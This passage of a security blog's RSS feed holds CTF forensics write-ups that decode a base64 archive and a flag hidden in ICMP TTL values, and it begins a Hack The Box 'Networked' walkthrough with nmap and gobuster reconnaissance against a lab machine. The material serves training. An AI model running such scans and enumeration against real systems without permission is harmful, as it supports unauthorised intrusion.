class="line">p8tGr&#x2F;TAMvk\nS95mq2hCNH+eWAaYbN5KZXCESEMGcRqINziqAwPvtvyltGoshg3ltuZlHLxOZzR8ZkowZSoV5fgo\ng9pSEUGBtBMq2qtDBLlymITFTp3MCFeOb+N+eDgfeFci8hEwnWUjDVoYCgobi48TOb7ABFMXtyiq\nwswb6ISphq0MJTsAq4s2xN7jOC&#x2F;2axOqojgr7S3hmL</span><br><span class="line">jp4wUxKMdnofRW2jTxnsNnRadGguu&#x2F;EBYf\nWSHHKKzsdwgJXm+Y0KevgXMn&#x2F;Pc4qudjB&#x2F;KHlrVDifWCC&#x2F;JFMilPhkp4b1AYhryG2qSQTFH0M2l5\nUUYgXSsr1L9Qu512OqpDx4&#x2F;RRXM8IYilCfwAFz9Ahd7bz4HrJ60WmxJcpkzght6AfPAyg0iI334j\nnmsF9EZWuULIrg9V3kD</span><br><span class="line">aicX2IJqtQmn0jffRWmE3N8PqzO6NlMIMLWfP3C0HImct5iHAoWvkHpIZ\nC9dfbTfUY9SgSfF8kqWyF61NN0m&#x2F;tuhjc2SDUvHozoOuJrI1ym4zbt&#x2F;O2keRRBfgeBvo4idO85wP\nXSZnHukci9YTr6Yuegif9ZmU5iPyevxieCGVx8+1LTHHXRdLoTVAKd4pLD0&#x2F;v&#x2F;HziHLz6TL2o3</span><br><span class="line">Z9\na3HzhW3On3NM61mDqktNIqlZcEQTjZsw4KcP+EqSETHdb104M1PRxwPnS48DSnsEEOKEJuCULSjm\nA9pwgloS&#x2F;lQ&#x2F;OoS9r8jgwNQh3rXwuMeZCCrLSgiTVvVMP8UPH24QMQz3SjVn&#x2F;K&#x2F;MkhVQZLh3P8wE\nUzQd&#x2F;891HbbBwGpuPcnxMXFyJt055EpBNz65f&#x2F;&#x2F;kV0RHvtqXgLK</span><br><span class="line">uKWLduEv&#x2F;ZLxMWclnIDWOdZzQ\nuriMG0zHRZeLWNDlUmKf3nzFYQEX&#x2F;27RW5Iwy&#x2F;Op&#x2F;qsAb86&#x2F;+erv5AA616Wf2EyL2Kl6GaBW0EVK\n8LAr1fdxzV&#x2F;+D&#x2F;GaX4xeCbrdv&#x2F;i49TEelUQ2Ut7hNlmqWo09r+1zZZsHo9jsrfUUQfmvoKZhvFuR\nefISfOWWyCoCmxHkyuP5IrW39G78</span><br><span class="line">xGMD6pE+2DqExH1Et8VWCBGXYnz&#x2F;6BEHM54xYIzN8QbeSwqx\ndKeB4y3jo7NvSfes5T6&#x2F;Z+WRn3CJ&#x2F;N4WDYfugACnSlk6BAx83OC+yV41PcjsLHS6x3o1HsOmXwBj\nz&#x2F;fDuXnAxXvO6bhkVWB&#x2F;Byvp9blK2Y7995M2Gx9U826Cj&#x2F;vY+OWbFi8ifLEvulVBMyRpONsJ5CuI\nZZ2nw</span><br><span class="line">6QeVYk2OA8H8+68DcIrArhaH4qaaOLPIny+VRCZ21MF0GzjDZkHJC+k0fH8cdI7aTuXVw0O\nnr8zGZ7rUNgyn7f14thYnqg9C1E+uPgqTp9bPhDuDHG0PApvj4fnORvGzZCU8YfZE22MGhGihTgA\ngmGHshEDvlP&#x2F;LICC5RPTCR7LwOtmPZeRlbA9C8bl&#x2F;UwM4h7Az8a1089Uj8Pu</span><br><span class="line">RvNOz8Mp3t717KHJ\nOtl0iy++jHj0qfpXkNn3BqmM7FsaP8Opn4efg6UI0nVg8kQqcD5KjWNVyd&#x2F;&#x2F;Wbnxoo4stjr4DOy7\nLI9Y9kO56NYZ9R54EiXw9UsyXnN4lvy62Al2rjRcpcA2yrK&#x2F;d52aDjP91AY0Q7PEHG3t++MG0jKl\nVEUPElOjyIQLbFcAAgv0omnHIfG3WrybE1AxV</span><br><span class="line">vAq25mxsS7NuyAQTs1+VOIbN+ZICRL9R6q9BXH+\nJ1yYwjPysIlEyUEfWsGFynPtAGdjtXA8hsDcWZU&#x2F;k1RFDlYu2w0jAQQGAAEJivAABwsBAAIkBvEH\nAQpTBwRUId45GliZISEBBQEADIrlwMxEAAgKAY5g2lMAAAUBGQUAAAAAABElAGUAbQBwAGwAbwB5\nAGUAZQBfAGQAYQ</span><br><span class="line">B0AGEALgB0AHgAdAAAABQKAQDQbKHeApTVARUGAQAgAAAAAAA&#x3D;\n&quot;)</span><br><span class="line">...     f.close()</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; exit()</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;Oh-My-Salary#</span><br></pre></td></tr></table></figure><p>After decoding the data I used <code>file</code> to check the type of the new file, it was a <code>7z</code> archive:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;Oh-My-Salary# base64 -d final.b64 &gt; final.decoded</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;Oh-My-Salary# file final.decoded </span><br><span class="line">final.decoded: 7-zip archive data, version 0.4</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;Oh-My-Salary#</span><br></pre></td></tr></table></figure><p>I tried to extract it, but it was password protected:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;Oh-My-Salary# 7z e final.decoded                                                                                                                                        </span><br><span class="line"></span><br><span class="line">7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21</span><br><span class="line">p7zip Version 16.02 (locale&#x3D;en_US.UTF-8,Utf16&#x3D;on,HugeFiles&#x3D;on                                                                          </span><br><span class="line"></span><br><span class="line">Scanning the drive for archives:</span><br><span class="line">1 file, 2954 bytes (3 KiB)</span><br><span class="line"></span><br><span class="line">Extracting archive: final.decoded</span><br><span class="line">--</span><br><span class="line">Path &#x3D; final.decoded</span><br><span class="line">Type &#x3D; 7z</span><br><span class="line">Physical Size &#x3D; 2954</span><br><span class="line">Headers Size &#x3D; 154</span><br><span class="line">Method &#x3D; LZMA2:24k 7zAES</span><br><span class="line">Solid &#x3D; -</span><br><span class="line">Blocks &#x3D; 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Enter password (will not be echoed):</span><br><span class="line">ERROR: Data Error in encrypted file. Wrong password? : employee_data.txt</span><br><span class="line"></span><br><span class="line">Sub items Errors: 1</span><br><span class="line"></span><br><span class="line">Archives with Errors: 1</span><br><span class="line"></span><br><span class="line">Sub items Errors: 1</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;Oh-My-Salary#</span><br></pre></td></tr></table></figure><p>I checked the network capture again and found an <code>HTTP</code> request to a file called <code>key.txt</code>:<br><img src="/images/ctfs/egctf-qual/26.png" alt=""></p><p><img src="/images/ctfs/egctf-qual/27.png" alt=""><br>The response was a base-64 encoded string so I decoded it then I used the result as a password:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;Oh-My-Salary# echo dGghc2MwbXBsZXhwQHNzdzByZA | base64 -d</span><br><span class="line">th!sc0mplexp@ssw0rdbase64: invalid input</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;Oh-My-Salary#</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;Oh-My-Salary# 7z e final.decoded</span><br><span class="line"></span><br><span class="line">7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21</span><br><span class="line">p7zip Version 16.02 (locale&#x3D;en_US.UTF-8,Utf16&#x3D;on,HugeFiles&#x3D;on</span><br><span class="line"></span><br><span class="line">Scanning the drive for archives:</span><br><span class="line">1 file, 2954 bytes (3 KiB)</span><br><span class="line"></span><br><span class="line">Extracting archive: final.decoded</span><br><span class="line">--</span><br><span class="line">Path &#x3D; final.decoded</span><br><span class="line">Type &#x3D; 7z</span><br><span class="line">Physical Size &#x3D; 2954</span><br><span class="line">Headers Size &#x3D; 154</span><br><span class="line">Method &#x3D; LZMA2:24k 7zAES</span><br><span class="line">Solid &#x3D; -</span><br><span class="line">Blocks &#x3D; 1</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">Enter password (will not be echoed):</span><br><span class="line">Everything is Ok        </span><br><span class="line"></span><br><span class="line">Size:       17612</span><br><span class="line">Compressed: 2954</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;Oh-My-Salary#</span><br></pre></td></tr></table></figure><p>And finally I got the flag:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;Oh-My-Salary# grep EGCTF .&#x2F;employee_data.txt </span><br><span class="line">|         154 | Nanette     | Cambrault   | NCAMBRAU | EGCTF&#123;04ebc6f21584ef9dd240190de62c493c&#125; | 1987-08-10 | SA_REP     |  7500.00 |           0.20 |        145 |            80 |</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;Oh-My-Salary#</span><br></pre></td></tr></table></figure><h2 id="Forensics-Secret-Agent"><a href="#Forensics-Secret-Agent" class="headerlink" title="Forensics: Secret Agent"></a>Forensics: Secret Agent</h2><h3 id="Challenge-Description-9"><a href="#Challenge-Description-9" class="headerlink" title="Challenge Description:"></a>Challenge Description:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A secret agent was found sending a message to an unknown party. We managed to intercept network traffic but could not recover the message. Can you help us?</span><br></pre></td></tr></table></figure><h3 id="Solution-9"><a href="#Solution-9" class="headerlink" title="Solution"></a>Solution</h3><p>We’re given a <code>pcapng</code> file called <code>SecretMessage.pcapng</code>, by looking at the capture in <code>wireshark</code> and sorting the packets according to their protocol I noticed a bunch of <code>ICMP</code> requests with weird <code>ttl</code>numbers:<br><img src="/images/ctfs/egctf-qual/28.png" alt=""><br>These numbers were <code>ASCII</code> characters codes, I tried decoding the first 5 ones and I got <code>EGCTF</code>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;secret-agent# python</span><br><span class="line">Python 2.7.16 (default, Apr  6 2019, 01:42:57)</span><br><span class="line">[GCC 8.3.0] on linux2</span><br><span class="line">Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.</span><br><span class="line">&gt;&gt;&gt; print chr(69)</span><br><span class="line">E</span><br><span class="line">&gt;&gt;&gt; print chr(71)</span><br><span class="line">G</span><br><span class="line">&gt;&gt;&gt; print chr(67)</span><br><span class="line">C</span><br><span class="line">&gt;&gt;&gt; print chr(84)</span><br><span class="line">T</span><br><span class="line">&gt;&gt;&gt; print chr(70)</span><br><span class="line">F</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>Doing it manually will take some time so I exported the <code>ICMP</code> packets as a <code>txt</code>:<br><img src="/images/ctfs/egctf-qual/29.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;secret-agent# cat icmp_packets</span><br><span class="line">No.     Time           Source                Destination           Protocol Length Info</span><br><span class="line">   4606 106.913965051  192.168.125.138       192.168.125.143       ICMP     42     Echo (ping) request  id&#x3D;0x0000, seq&#x3D;0&#x2F;0, ttl&#x3D;69 (reply in 4607)</span><br><span class="line"></span><br><span class="line">Frame 4606: 42 bytes on wire (336 bits), 42 bytes captured (336 bits) on interface 0</span><br><span class="line">Ethernet II, Src: Vmware_44:51:4f (00:0c:29:44:51:4f), Dst: Vmware_86:2b:43 (00:0c:29:86:2b:43)</span><br><span class="line">Internet Protocol Version 4, Src: 192.168.125.138, Dst: 192.168.125.143</span><br><span class="line">Internet Control Message Protocol</span><br><span class="line">---</span><br><span class="line">No.     Time           Source                Destination           Protocol Length Info</span><br><span class="line">   4748 110.024784457  192.168.125.143       192.168.125.138       ICMP     60     Echo (ping) reply    id&#x3D;0x0000, seq&#x3D;0&#x2F;0, ttl&#x3D;128 (request in 4747)                                                             </span><br><span class="line"></span><br><span class="line">Frame 4748: 60 bytes on wire (480 bits), 60 bytes captured (480 bits) on interface 0</span><br><span class="line">Ethernet II, Src: Vmware_86:2b:43 (00:0c:29:86:2b:43), Dst: Vmware_44:51:4f (00:0c:29:44:51:4f)</span><br><span class="line">Internet Protocol Version 4, Src: 192.168.125.143, Dst: 192.168.125.138</span><br><span class="line">Internet Control Message Protocol</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;secret-agent#</span><br></pre></td></tr></table></figure><p>I used <code>grep</code> to get only the lines with <code>ttl</code>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;secret-agent# cat icmp_packets | grep &quot;ttl&quot;</span><br><span class="line">   4606 106.913965051  192.168.125.138       192.168.125.143       ICMP     42     Echo (ping) request  id&#x3D;0x0000, seq&#x3D;0&#x2F;0, ttl&#x3D;69 (reply in 4607)</span><br><span class="line">   4607 106.914430466  192.168.125.143       192.168.125.138       ICMP     60     Echo (ping) reply    id&#x3D;0x0000, seq&#x3D;0&#x2F;0, ttl&#x3D;128 (request in 4606)</span><br><span class="line">---</span><br><span class="line">   4747 110.022313975  192.168.125.138       192.168.125.143       ICMP     42     Echo (ping) request  id&#x3D;0x0000, seq&#x3D;0&#x2F;0, ttl&#x3D;125 (reply in 4748)                                                               </span><br><span class="line">   4748 110.024784457  192.168.125.143       192.168.125.138       ICMP     60     Echo (ping) reply    id&#x3D;0x0000, seq&#x3D;0&#x2F;0, ttl&#x3D;128 (request in 4747)                                                             </span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;secret-agent#</span><br></pre></td></tr></table></figure><p>Then by using <code>cut</code> I got the <code>ttl</code> numbers only:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;secret-agent# cat icmp_packets | grep &#39;ttl&#39; | cut -d &quot;&#x3D;&quot; -f 4 | cut -d &quot;(&quot; -f 1</span><br><span class="line">69 </span><br><span class="line">128 </span><br><span class="line">71 </span><br><span class="line">128 </span><br><span class="line">---</span><br><span class="line">95</span><br><span class="line">128</span><br><span class="line">125</span><br><span class="line">128</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;secret-agent#</span><br></pre></td></tr></table></figure><p>We don’t need <code>128</code> because that’s the <code>ttl</code> number from the response packets so we’ll remove it by piping to <code>grep -v &quot;128&quot;</code>, then finally will use <code>echo -n</code> on the output to produce a single line output:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;secret-agent# echo -n &#96;cat icmp_packets | grep &#39;ttl&#39; | cut -d &quot;&#x3D;&quot; -f 4 | cut -d &quot;(&quot; -f 1 | grep -v &quot;128&quot;&#96;</span><br><span class="line">69 71 67 84 70 123 89 48 117 95 71 48 84 95 116 104 101 95 70 76 64 103 95 84 84 76 95 109 64 110 105 112 117 108 97 116 105 111 110 95 33 115 95 65 119 101 115 48 109 101 95 67 48 110 103 114 64 116 117 108 114 97 116 105 111 110 95 95 125</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;secret-agent#</span><br></pre></td></tr></table></figure><p>I used the <code>ASCII</code> code <a href="https://www.dcode.fr/ascii-code" target="_blank" rel="noopener">tool</a> from <a href="https://www.dcode.fr" target="_blank" rel="noopener">dcode.fr</a> to decode the flag:<br><img src="/images/ctfs/egctf-qual/30.png" alt=""></p><p>That’s it , Feedback is appreciated !<br>Don’t forget to read the <a href="/categories">other write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener">@Ahm3d_H3sham</a><br>Thanks for reading.</p>]]></content:encoded>
      
      <comments>https://0xrick.github.io/ctfs/egctf-qual/#disqus_thread</comments>
    </item>
    
    <item>
      <title>Hack The Box - Networked</title>
      <link>https://0xrick.github.io/hack-the-box/networked/</link>
      <guid>https://0xrick.github.io/hack-the-box/networked/</guid>
      <pubDate>Sat, 16 Nov 2019 03:00:00 GMT</pubDate>
      <description>
      
        My write-up / walkthrough for Networked from Hack The Box.
      
      </description>
      
      
      <content:encoded><![CDATA[<h1 id="Hack-The-Box-Networked"><a href="#Hack-The-Box-Networked" class="headerlink" title="Hack The Box - Networked"></a>Hack The Box - Networked</h1><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>Hey guys, today Networked retired and here’s my write-up about it. It was a quick fun machine with an <code>RCE</code> vulnerability and a couple of command injection vulnerabilities. It’s a Linux box and its ip is <code>10.10.10.146</code>, I added it to <code>/etc/hosts</code> as <code>networked.htb</code>. Let’s jump right in !<br><img src="/images/hackthebox/networked/0.png" alt=""></p><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>As always we will start with <code>nmap</code> to scan for open ports and services:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;networked# nmap -sV -sT -sC -o nmapinitial networked.htb</span><br><span class="line">Starting Nmap 7.70 ( https:&#x2F;&#x2F;nmap.org ) at 2019-11-16 01:16 EET </span><br><span class="line">Nmap scan report for networked.htb (10.10.10.146)</span><br><span class="line">Host is up (1.7s latency).</span><br><span class="line">Not shown: 997 filtered ports</span><br><span class="line">PORT    STATE  SERVICE VERSION</span><br><span class="line">22&#x2F;tcp  open   ssh     OpenSSH 7.4 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA)</span><br><span class="line">|   256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 (ECDSA)</span><br><span class="line">|_  256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 (ED25519)</span><br><span class="line">80&#x2F;tcp  open   http    Apache httpd 2.4.6 ((CentOS) PHP&#x2F;5.4.16)</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.6 (CentOS) PHP&#x2F;5.4.16</span><br><span class="line">|_http-title: Site doesn&#39;t have a title (text&#x2F;html; charset&#x3D;UTF-8).</span><br><span class="line">443&#x2F;tcp closed https</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 147.70 seconds</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;networked#</span><br></pre></td></tr></table></figure><p>We got <code>ssh</code> on port 22 and <code>http</code> on port 80, let’s check the web service.</p><h2 id="Web-Enumeration"><a href="#Web-Enumeration" class="headerlink" title="Web Enumeration"></a>Web Enumeration</h2><p>The index page had nothing except for this message:<br><img src="/images/hackthebox/networked/1.png" alt=""><br>So I ran <code>gobuster</code> to check for sub directories and I found 2 interesting directories, <code>/uploads</code> and <code>/backup</code>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;networked# gobuster -u http:&#x2F;&#x2F;networked.htb&#x2F; -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;common.txt                                                                                                </span><br><span class="line"></span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Gobuster v2.0.1              OJ Reeves (@TheColonial)</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">[+] Mode         : dir</span><br><span class="line">[+] Url&#x2F;Domain   : http:&#x2F;&#x2F;networked.htb&#x2F;</span><br><span class="line">[+] Threads      : 10</span><br><span class="line">[+] Wordlist     : &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;common.txt</span><br><span class="line">[+] Status codes : 200,204,301,302,307,403</span><br><span class="line">[+] Timeout      : 10s</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">2019&#x2F;11&#x2F;16 01:21:45 Starting gobuster</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x2F;.hta (Status: 403)</span><br><span class="line">&#x2F;.htpasswd (Status: 403)</span><br><span class="line">&#x2F;.htaccess (Status: 403)</span><br><span class="line">&#x2F;backup (Status: 301)</span><br><span class="line">&#x2F;cgi-bin&#x2F; (Status: 403)</span><br><span class="line">&#x2F;index.php (Status: 200)</span><br><span class="line">&#x2F;uploads (Status: 301)</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">2019&#x2F;11&#x2F;16 01:24:26 Finished</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;networked#</span><br></pre></td></tr></table></figure><p>In <code>/backup</code> I found a <code>tar</code> archive that had a backup of all the site’s pages:<br><img src="/images/hackthebox/networked/2.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span 